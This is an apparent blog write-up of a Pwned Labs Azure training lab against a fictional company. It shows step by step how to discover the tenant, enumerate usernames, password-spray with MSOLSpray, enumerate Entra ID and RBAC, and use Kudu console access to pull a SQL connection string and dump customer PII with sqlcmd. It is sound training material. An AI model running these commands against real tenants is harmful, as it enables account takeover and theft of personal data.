---
title: "Azure Recon to Foothold and Profit"
date: 2024-10-28T14:13:44+01:00
description: "Discover how various reconnaisance techniques could be used to enumerate Azure subscriptions and Tenant to identify mistakes or weak points when setting up an environment"
categories: [Cloud]
tags: [Azure, Red Teaming, Entra-ID, Powershell]
---

**Note : This article was inspired by content from [Pwned Labs](https://pwnedlabs.io/labs/azure-recon-to-foothold-and-profit). Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.**

![](/b09c1a5729661d9abce16e7c454acadc.gif#center)


## **WalkThrough**

A possible password leak was found on [pastebin](https://pastebin.com/ZfqZdpX8)


- We need to determine if Mega Big Tech is using Azure Entra ID to manage their identities.
- The domain name [megabigtech.com](megabigtech.com) was given and it is possible check if a particular company is using Entra ID for authentication by browsing to the URL below.


[https://login.microsoftonline.com/getuserrealm.srf?login=megabigtech.com&xml=1](https://login.microsoftonline.com/getuserrealm.srf?login=megabigtech.com&xml=1)

- Whereas replacing the `?login` parameter with the domain name 
- Then if the `NameSpaceType` value shows as `Managed` then the company is using Entra ID ;



![](https://i.imgur.com/LmiBYWa.png)


-  The `GetUserRealm.srf` path is known as a **user realm discovery** described by Microsoft
	- An input is given on the Microsoft sign-in page for the username value
	- A request is then sent to this endpoint to determine the type of account associated with that username



We can then attempt to get more information about the tenant since we know the company is using Entra ID.

The following URL allows us to do this, by using the `.well-known/openid-configuration` endpoint in the context of `OpenID` Connect (`OIDC`), which is an identity layer on top of the `OAuth` 2.0 protocol.

[https://login.microsoftonline.com/megabigtech.com/.well-known/openid-configuration](https://login.microsoftonline.com/megabigtech.com/.well-known/openid-configuration)


This is a critical endpoint for -:

1. Clients to discover how to interact with the identity provider's `OAuth` 2.0
2. Clients to discover how to interact with the identity provider's `OpenID` Connect services


As shown in the below screenshot the Tenant ID is revealed -:


![](https://i.imgur.com/f3aecVs.png)



There are also alternate ways to enumerate this for example, using tools like [AADInternals](https://aadinternals.com/aadinternals/)


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Install-Module AADInternals

PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Import-Module AADInternals

    ___    ___    ____  ____      __                        __    
   /   |  /   |  / __ \/  _/___  / /____  _________  ____ _/ /____
  / /| | / /| | / / / // // __ \/ __/ _ \/ ___/ __ \/ __ `/ / ___/
 / ___ |/ ___ |/ /_/ _/ // / / / /_/  __/ /  / / / / /_/ / (__  ) 
/_/  |_/_/  |_/_____/___/_/ /_/\__/\___/_/  /_/ /_/\__,_/_/____/  
  
 v0.9.4 by @DrAzureAD (Nestori Syynimaa)
```

With the below commands we can get the domain information and the Tenant ID  


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Get-AADIntLoginInformation -Domain megabigtech.com

Federation Metadata Url              : 
Cloud Instance                       : microsoftonline.com
Account Type                         : Managed
Federation Brand Name                : Default Directory
Tenant Banner Logo                   : 
State                                : 4
Pref Credential                      : 1
Cloud Instance audience urn          : urn:federation:MicrosoftOnline
Tenant Banner Illustration           : 
Authentication Url                   : 
Domain Name                          : megabigtech.com
Exists                               : 1
Federation Active Authentication Url : 
Domain Type                          : 3
Federation Protocol                  : 
Throttle Status                      : 0
Has Password                         : True
Consumer Domain                      : 
Tenant Locale                        : 
Federation Global Version            : 
User State                           : 1
Desktop Sso Enabled                  : 



PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Get-AADIntTenantID -Domain megabigtech.com
2590ccef-687d-493b-ae8d-441cbab63a72
```


We can also run the next command, which looks to answer the following questions as described by **PwnedLabs** :

  

| Value                                                                                                                                                                        | Description                                                                             |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| DNS                                                                                                                                                                          | Does the DNS record exist?                                                              |
| [MX](https://learn.microsoft.com/en-us/microsoft-365/enterprise/external-domain-name-system-records?#external-dns-records-required-for-email-in-office-365-exchange-online)  | Does the MX point to Office 365?                                                        |
| [SPF](https://learn.microsoft.com/en-us/microsoft-365/enterprise/external-domain-name-system-records?#external-dns-records-required-for-email-in-office-365-exchange-online) | Does the SPF contain Exchange Online?                                                   |
| [Type](https://learn.microsoft.com/en-us/microsoft-365/enterprise/deploy-identity-solution-identity-model?#authentication-for-hybrid-identity)                               | Federated or Managed                                                                    |
| [DMARC](https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/email-authentication-dmarc-configure)                                                   | Is the DMARC record configured?                                                         |
| [DKIM](https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/email-authentication-dkim-configure)                                                     | Is the DKIM record configured?                                                          |
| [MTA-STS](https://techcommunity.microsoft.com/t5/exchange-team-blog/introducing-mta-sts-for-exchange-online/ba-p/3106386)                                                    | Is the MTA-STS recored configured?                                                      |
| STS                                                                                                                                                                          | The FQDN of the federated IdP’s (Identity Provider) STS (Security Token Service) server |
| [RPS](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/operations/create-a-relying-party-trust)                                                               | Relaying parties of STS (AD FS). Requires -GetRelayingParties switch.                   |

Source: [https://aadinternals.com/aadinternals/#invoke-aadintreconasoutsider](https://aadinternals.com/aadinternals/#invoke-aadintreconasoutsider)


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Invoke-AADIntReconAsOutsider -Domain "megabigtech.com" | Format-Table
Tenant brand:       Default Directory
Tenant name:        iancloudpwned.onmicrosoft.com
Tenant id:          2590ccef-687d-493b-ae8d-441cbab63a72
Tenant region:      EU
DesktopSSO enabled: False

Name                                 DNS    MX   SPF DMARC  DKIM MTA-STS Type    STS                                    
----                                 ---    --   --- -----  ---- ------- ----    ---                                    
iancloudpwned.mail.onmicrosoft.com False False False       False   False Managed                                        
iancloudpwned.onmicrosoft.com      False False False       False   False Managed                                        
international-am.com               False False False       False   False Managed                                        
megabigtech.com                    False False False       False   False Managed 
```


We can also gather subdomains using the  [AzSubEnum](https://github.com/yuyudhn/AzSubEnum) tool, a specialized subdomain enumeration tool tailored for Azure services.


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> git clone https://github.com/yuyudhn/AzSubEnum.git
Cloning into 'AzSubEnum'...
remote: Enumerating objects: 45, done.
remote: Counting objects: 100% (45/45), done.
remote: Compressing objects: 100% (38/38), done.
remote: Total 45 (delta 20), reused 19 (delta 6), pack-reused 0 (from 0)
Receiving objects: 100% (45/45), 386.80 KiB | 235.00 KiB/s, done.
Resolving deltas: 100% (20/20), done.

PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> cd ./AzSubEnum/

PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab/AzSubEnum> python3 azsubenum.py -b megabigtech --thread 10


Discovered Subdomains:

App Services - Management:
---------------------------------------
megabigtech.scm.azurewebsites.net      

App Services:
-----------------------------------
megabigtech.azurewebsites.net 
```


Navigating to the discovered **App Services** subdomain we have the below web page

![](https://i.imgur.com/ioB50En.png)



According to the above screenshots

- We have some employees and their roles assigned
- We also have an email format ; "`Kato.Sara@megabigtech.com`" which could be used to create other emails also as shown below :


```
yuki.tanaka@megabigtech.com
yamamoto.sota@megabigtech.com
takahashi.hina@megabigtech.com
kato.sara@megabigtech.com
```


Since we now have a username wordlist we can manually test them by going to [https://login.microsoftonline.com](https://login.microsoftonline.com/). If a username is valid we would be prompted for a password else, a message "`This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin.`" would be returned 


It is possible to automate this whole process though by using a tool called  [Omnispray](https://github.com/0xZDH/Omnispray) 

```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> git clone https://github.com/0xZDH/Omnispray
Cloning into 'Omnispray'...            
remote: Enumerating objects: 460, done.
remote: Counting objects: 100% (45/45), done.
remote: Compressing objects: 100% (31/31), done.
remote: Total 460 (delta 27), reused 19 (delta 14), pack-reused 415 (from 1)
Receiving objects: 100% (460/460), 87.13 KiB | 97.00 KiB/s, done.
Resolving deltas: 100% (302/302), done.

PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> cd ./Omnispray/

PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab/Omnispray> nano users.txt

PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab/Omnispray> python3 omnispray.py --type enum -uf users.txt --module o365_enum_office

            *** Omnispray ***            

>---------------------------------------<

   > version        :  0.1.4
   > module         :  o365_enum_office
   > type           :  enum        
   > userfile       :  users.txt 
   > count          :  1 passwords/spray  
   > lockout        :  15.0 minutes
   > wait           :  5.0               
   > timeout        :  25 seconds
   > pause          :  0.25 seconds
   > rate           :  10 threads
   > start          :  2024-10-26 15:15:52

>---------------------------------------<

[2024-10-26 15:15:52,906] INFO : Generating prerequisite data via office.com...
[2024-10-26 15:16:17,914] INFO : Enumerating 4 users via 'o365_enum_office' module
[2024-10-26 15:16:30,667] INFO : [ + ] yuki.tanaka@megabigtech.com
[ - ] yamamoto.sota@megabigtech.com
[2024-10-26 15:16:32,797] INFO : Results can be found in: '/home/sec-fortress/Az_lab/Omnispray/results/'
[2024-10-26 15:16:32,797] INFO : Valid user accounts: 1

[2024-10-26 15:16:33,049] INFO : /home/sec-fortress/Az_lab/Omnispray/omnispray.py executed in 40.26 seconds.

```

Since we now have a valid set of account we can go ahead and perform a credential stuffing or password spraying attack as this are definitely noisy and risk detection (and locking accounts), and so it's often worth exploring other avenues.

```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> wget https://raw.githubusercontent.com/dafthack/MSOLSpray/refs/heads/master/MSOLSpray.ps1


Saving to: ‘MSOLSpray.ps1’MSOLSpray.ps1                                   100%[=====================================================================================================>]   8.52K  32.0KB/s    in 0.3s                                                                                                                                                                                                   2024-10-26 15:25:51 (32.0 KB/s) - ‘MSOLSpray.ps1’ saved [8727/8727]

## Import module with dot sourcing

PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> . .\MSOLSpray.ps1

PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> echo "yuki.tanaka@megabigtech.com" > valid_user

PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Invoke-MSOLSpray -UserList ./valid_user -Password "MegaDev79$" -Verbose
[*] There are 1 total users to spray.
[*] Now spraying Microsoft Online.
[*] Current date and time: 10/26/2024 15:27:00
VERBOSE: POST with 195-byte payload
VERBOSE: received 3677-byte response of content type application/json
[*] SUCCESS! yuki.tanaka@megabigtech.com : MegaDev79$  
```


> "**Note**: very often we wouldn’t be able to just log directly into a tenant over the Internet as MFA is getting more common place. Other guided labs from Pwned Labs where explored on how to check if MFA is enabled for gaps and to gain access." -- ***PwnedLabs***


We can then attempt to gather as much information as possible with our credentialed access using the Az Powershell and Microsoft Graph PowerShell SDK modules


```
Connect-AzAccount
Connect-MgGraph
```



To Enumerate all users in the tenant we can issue the following command.


```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Get-AzADUser
```


![](https://i.imgur.com/SD3TJ47.jpeg)


Here are some few questions to ask after getting foothold with a compromised user as described by **PwnedLabs**:

- Is the user part of any group? If so, does this group has any role assigned to it?
- Does the user have any Azure Entra ID roles assigned to them?
- Which objects has this user created?
- Is this user the owner of any service principal?



We can go ahead and query individual properties a using the Az PowerShell module which could help in mapping out possible responsibilities and relationships within the company.


```powershell
Get-AzADUser -UserPrincipalName 'yuki.tanaka@megabigtech.com' | fl
```


![](https://i.imgur.com/BFxXMf8.png)


Using the below command we could also check if there are resources owned by our current user (None Unfortunately) .


```
Get-MgUserOwnedObject -UserId "yuki.tanaka@megabigtech.com"
```


![](https://i.imgur.com/SGtIolQ.png)


We could also check if our present user is a member of any groups by looping through all groups with the below script.



```powershell
$userId = "yuki.tanaka@megabigtech.com"
$groupIds = (Get-MgUserMemberOf -UserId $userId).Id

$groupNames = @()

foreach ($groupId in $groupIds) {
    $group = Get-MgGroup -GroupId $groupId
    $groupNames += $group.DisplayName
}

$groupNames
```


![](https://i.imgur.com/V9y4WuH.png)





No interesting data or role where discovered in this tenant, We can switch to the Azure Subscription and enumerate which `RBAC` roles this user has.


- Retrieve the current authentication context for Azure Resource Manager requests

```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab>  Get-AzContext

   Tenant: Default Directory (2590ccef-687d-493b-ae8d-441cbab63a72)

SubscriptionName            SubscriptionId                       Account                     Environment
----------------            --------------                       -------                     -----------
Microsoft Azure Sponsorship ceff06cb-e29d-4486-a3ae-eaaec5689f94 yuki.tanaka@megabigtech.com AzureCloud
```



The `Get-AzContext -ListAvailable` cmdlet returns all available, previously logged in contexts

![](https://i.imgur.com/2SxoGDs.png)


- If a user hasn't executed the `Disconnect-AzAccount` command
- The session's context remains active!
- In which the `Select-AzContext` command could be used to impersonate the session. See [Blog1](https://learn.microsoft.com/en-us/powershell/module/az.accounts/select-azcontext?view=azps-12.4.0), [Blog2](https://stackoverflow.com/questions/56691220/set-azcontext-works-in-azure-cloud-shell-but-doesnt-in-azure-powershell) and [Blog3](https://matthewdavis111.com/powershell/azure-az-context/) to understand more.



![](https://i.imgur.com/D8NlWYh.png)



- Enumerate subscriptions that are accessible/available to the current user

```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Get-AzSubscription  

   TenantId: 2590ccef-687d-493b-ae8d-441cbab63a72

Name                        Id                                   State
----                        --                                   -----
Microsoft Azure Sponsorship ceff06cb-e29d-4486-a3ae-eaaec5689f94 Enabled
```



> **Food For Thoughts :**
> 
> *So, **many subscriptions can share one tenant, but each subscription is “loyal” to just one tenant**.*

The below command will return the resources for which the user has _at least_ the Reader role in Role-Based Access Control (`RBAC`)

```powershell
PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab> Get-AzResource

Name              : megabigtechdevapp23
ResourceGroupName : mbt-rg-3
ResourceType      : Microsoft.Web/sites
Location          : eastus
ResourceId        : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-3/providers/Microsoft.Web/sites/megabigtechdevapp23
Tags              : 
```


We can check what `RBAC` permissions we have over this Web App by running the following cmdlet

```powershell
Get-AzRoleAssignment -SignInName <User-Email>
```

![](https://i.imgur.com/vsrAAzZ.png)

***Break Down :***

- User has the **Website Contributor** role on an Azure App Service.
- This role includes **access to the Kudu console**, a tool for debugging and monitoring Azure Web Apps.
- The **Kudu console** provides terminal access to the app’s underlying operating system in a low-privilege Linux sandbox.
- If the web app connects to other Azure resources (e.g., Azure SQL, Storage Account, Key Vault), the user may access these in the **context of the app’s permissions**.



We can go ahead an enumerate the web app further using the following cmdlet

```powershell
Get-AzWebApp -Name megabigtechdevapp23 | select enabledhostnames
```

![](https://i.imgur.com/bY8Q7CO.jpeg)



We are more concerned about the `megabigtachdevapp23.scm.azurewebsites.net` output. Notice the `scm` between the app’s name and the default azure domain `azurewebsites.net` . 

`SCM` stands for Source Control Manager, otherwise known as **Kudu**.


Navigating to this domain gives us this web page as shown below :


![](https://i.imgur.com/bUUlh51.png)




Next, click on `Debug console` > `PowerShell` .


![](https://i.imgur.com/sjH1k0x.png)




***Exploit Option 1 :***


- Web Apps often connect to backend resources using **managed identities** (a best practice).
- To verify this, check for **environment variables** like `IDENTITY_ENDPOINT` and `IDENTITY_HEADER`, which are required by managed identities.
- If these variables are present, you can **request a token** on behalf of the app to access its connected resources.
- For further details checkout this [blog](https://posts.specterops.io/abusing-azure-app-service-managed-identity-assignments-c3adefccff95)


***Exploit Option 2 :***



- Web Apps can also connect to resources using **connection strings** stored in **environment variables** (via App settings).
- You can **list all environment variables** with the `env` command.
- To find relevant variables, use `grep` to **filter by keywords** (e.g., connection string names or resource names).


```bash
env | grep -i -e "DB"
```


![](https://i.imgur.com/vGjnj9R.png)



As shown in the above screenshot we got a connection string for an azure SQL instance at the well-known domain `database.windows.net` which provides us with the necessary credentials to connect to the database!


It is possible to enumerate useful software on this PowerShell session using the below cmdlet such as:

- **Microsoft SQL Server Command Line Utilities**
- **`SQLCMD`**
- **Microsoft SQL Server** (along with any mention of "Tools" or "Utilities")
- **`ODBC` Driver for SQL Server** (sometimes `sqlcmd` is installed alongside `ODBC` drivers)


```powershell
Get-ItemProperty -Path "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" |where { $_.DisplayName -ne $null } | Select-Object DisplayName, DisplayVersion, InstallDate
```


![](https://i.imgur.com/EAQphH0.png)



We can therefore query the database and check for available tables.



```powershell
sqlcmd -S megabigdevsqlserver.database.windows.net -U <Username> -P <'Password'> -d <DB-NAME> -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'"
```


![](https://i.imgur.com/5zkYMec.png)


The `CustomerData` table was returned in output. Retrieving data from this table reveals `PII` (personally identifiable information) of Mega Big Tech customers :(

```powershell
sqlcmd -S megabigdevsqlserver.database.windows.net -U <Username> -P <'Password'> -d <DB-NAME> -Q "SELECT * FROM CustomerData"
```



![](https://i.imgur.com/5tSIOLG.png)



That's all for today. For further reading, I recommend checking out [PwnedLabs](https://pwnedlabs.io/labs/azure-recon-to-foothold-and-profit), which includes defensive strategies to mitigate these issues ⛇☃︎.